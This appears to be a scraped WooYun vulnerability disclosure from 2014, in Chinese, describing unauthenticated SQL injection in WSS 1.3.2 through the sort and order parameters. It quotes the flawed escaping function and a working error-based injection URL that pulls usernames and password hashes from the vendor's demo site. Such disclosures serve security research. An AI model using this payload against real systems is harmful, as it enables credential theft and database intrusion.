{"id": 42998, "wybug_id": "wooyun-2014-084151", "wybug_title": "WSS最新版多处SQL注入直接获取数据三（官方demo演示及快速定位漏洞技巧）", "wybug_corp": "WSS Lab", "wybug_author": "xfkxfk", "wybug_date": "2014-11-21 17:58", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-26：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： WSS最新版多处SQL注入直接获取数据三，官方demo演示，这里存在多处，对同一问题进行总结 详细说明：  WSS最新版1.3.2，这里存在多处，并对此同一问题进行总结，以及快速查找同一问题全部漏洞\n这里的漏洞没有任何权限限制，任何用户都能进行注入\n漏洞分析： WooYun: WSS最新版某处SQL注入直接获取数据二（两处） WSS最新版某处SQL注入直接获取数据二（两处）这个漏洞之前已经降到了漏洞的过程因为全局过滤函数设计缺陷导致sql注入\nif (!function_exists(\"GetSQLValueString\")) {function GetSQLValueString($theValue, $theType, $theDefinedValue = \"\", $theNotDefinedValue = \"\") {  if (PHP_VERSION < 6) {    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;  }  $theValue = function_exists(\"mysql_real_escape_string\") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);  switch ($theType) {    case \"text\":      $theValue = ($theValue != \"\") ? \"'\" . $theValue . \"'\" : \"NULL\";      break;        case \"long\":    case \"int\":      $theValue = ($theValue != \"\") ? intval($theValue) : \"NULL\";      break;    case \"double\":      $theValue = ($theValue != \"\") ? doubleval($theValue) : \"NULL\";      break;    case \"date\":      $theValue = ($theValue != \"\") ? \"'\" . $theValue . \"'\" : \"NULL\";      break;    case \"defined\":      $theValue = ($theValue != \"\") ? $theDefinedValue : $theNotDefinedValue;      break;  }  return $theValue;}}\n看这里\ncase \"defined\":      $theValue = ($theValue != \"\") ? $theDefinedValue : $theNotDefinedValue;\n如果进到这里的话，就等于没有进行任何处理，然后返回了相应数据恰恰在程序里面很大地方都使用了这里的defined值，导致过滤无效漏洞定位：我们全局搜索：\n\"defined\",\n得到6处存在漏洞的地方：\n\ndefault_user.php上一个漏洞已经详细分析过了这里我们看看control_project.php和control_task.php以control_task.php为例：\n......$sortlist = \"csa_last_update\";if (isset($_GET['sort'])) {  $sortlist = $_GET['sort'];}$orderlist = \"DESC\";if (isset($_GET['order'])) {  $orderlist= $_GET['order'];}......$query_Recordset1 = sprintf(\"SELECT *, \t\t\t\t\t\t\t\t\t\t\t\t\t\ttk_project.project_name as project_name_prt,\t\t\t\t\t\t\ttk_user1.tk_display_name as tk_display_name1, \t\t\t\t\t\t\ttk_user2.tk_display_name as tk_display_name2\t\t\t\t\t\t\t\t\t\t\t\t\t\tFROM tk_task  \t\t\t\t\t\t\tinner join tk_task_tpye on tk_task.csa_type=tk_task_tpye.id\t\t\t\t\t\t\tinner join tk_project on tk_task.csa_project=tk_project.id\t\t\t\t\t\t\t\t\t\t\t\t\t\tinner join tk_user as tk_user1 on tk_task.csa_to_user=tk_user1.uid \t\t\t\t\t\t\tinner join tk_user as tk_user2 on tk_task.csa_from_user=tk_user2.uid \t\t\t\t\t\t\t\t\t\t\t\t\t\tinner join tk_status on tk_task.csa_remark2=tk_status.id\t\t\t\t\t\t\t\t\t\t\t\t\t\t$where \t\t\t\t\t\t\t(tk_task.csa_plan_st <=%s \t\t\t\t\t\t\tAND tk_task.csa_plan_et >=%s\t\t\t\t\t\t\tOR tk_task.csa_plan_st <=%s \t\t\t\t\t\t\tAND tk_task.csa_plan_et >=%s\t\t\t\t\t\t\tOR tk_task.csa_plan_st >=%s \t\t\t\t\t\t\tAND tk_task.csa_plan_et <=%s)\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tORDER BY %s %s\", \t\t\t\t\t\t\t\t\t\t\t\t\t\tGetSQLValueString($startday , \"text\"),\t\t\t\t\t\t\tGetSQLValueString($startday , \"text\"),\t\t\t\t\t\t\tGetSQLValueString($endday , \"text\"),\t\t\t\t\t\t\tGetSQLValueString($endday , \"text\"),\t\t\t\t\t\t\tGetSQLValueString($startday , \"text\"),\t\t\t\t\t\t\tGetSQLValueString($endday , \"text\"),\t\t\t\t\t\t\tGetSQLValueString($sortlist, \"defined\", $sortlist, \"NULL\"),\t\t\t\t\t\t\tGetSQLValueString($orderlist, \"defined\", $orderlist, \"NULL\")\t\t\t\t\t\t\t);$query_limit_Recordset1 = sprintf(\"%s LIMIT %d, %d\", $query_Recordset1, $startRow_Recordset1, $maxRows_Recordset1);$Recordset1 = mysql_query($query_limit_Recordset1, $tankdb) or die(mysql_error());$row_Recordset1 = mysql_fetch_assoc($Recordset1);\n漏洞原理跟上一个漏洞一致都是sort和order参数进入GetSQLValueString函数后，使用了defined类型，导致过滤失效这里直接访问control_project.php和control_task.php是不行的，会报错且这里存在绝对路径泄露：\n\n那么肯定是在其他地方调用了我们继续全局搜索：\ncontrol_project\n在/project.php调用：\n<div class=\"pagemargin\"><?php require('control_project.php'); ?></div>\n继续搜索\ncontrol_task\n在/index.php调用：\n<div class=\"pagemargin\"><?php require('control_task.php'); ?></div>\n因为在index.php和project.php页面，且control_project.php和control_task.php没有权限限制，全部用户都有权限访问下面我们在官方demo测试   漏洞证明：  官方demo是最新正式版1.3.2\nhttp://wssys.sinaapp.com/project.php?sort=uid%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20concat(0x23,tk_user_login,0x23,tk_user_pass)%20from%20tk_user%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b)%23&order=222222%27\n\n\n\nhttp://wssys.sinaapp.com/project.php?sort=uid%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20concat(0x23,tk_user_login,0x23,tk_user_pass)%20from%20tk_user%20limit%200,1))a%20from%20information_schema.tables%20group%20by%20a)b)%23&order=222222%27\n\n\n   修复方案：     版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-21 18:26 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  前来学习技巧    \n     2014-11-22 11:54 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  mark一下，学习大湿技巧    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}